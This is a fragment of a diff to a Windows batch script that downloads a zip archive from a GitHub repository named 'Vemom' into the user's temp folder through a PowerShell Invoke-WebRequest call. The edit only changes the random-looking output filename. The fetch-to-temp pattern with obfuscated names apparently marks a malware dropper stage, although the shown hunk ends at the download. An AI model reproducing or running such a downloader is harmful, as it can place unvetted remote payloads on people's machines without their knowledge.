@@ -2,7 +2,7 @@
 setlocal
 set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/UGRB.zip"
 set "tempdir=%temp%"
-set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
+set "output=%tempdir%\wctF4C4.zip"
 
 :download
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
